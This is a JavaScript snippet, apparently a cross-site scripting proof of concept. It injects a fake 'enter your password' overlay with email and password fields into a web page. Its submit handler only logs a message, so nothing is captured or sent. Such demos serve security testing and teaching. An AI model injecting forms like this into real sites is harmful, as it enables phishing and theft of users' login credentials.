const box = document.createElement('div')
box.innerHTML = `
<p>Please enter your password below!</p>

  <form id="xssform">
    <div>
      <input type="email" class="" placeholder="Email address">
      <input type="password" class="" placeholder="Password">
      <button id="xssbutton" type="submit" class="">Submit</button>
    </div>
  </form>
  
`;
box.setAttribute("z-index", "99999");
box.style.position = "fixed";
box.style.top = "50px";
box.style.margin = "0 auto";
box.style.background = "green";
box.style.padding = "10px";
document.body.appendChild(box);
document.querySelector("#xssbutton").addEventListener("click", (e) => {
  e.stopPropagation();
  e.preventDefault();

  console.log("button clicked!")
});
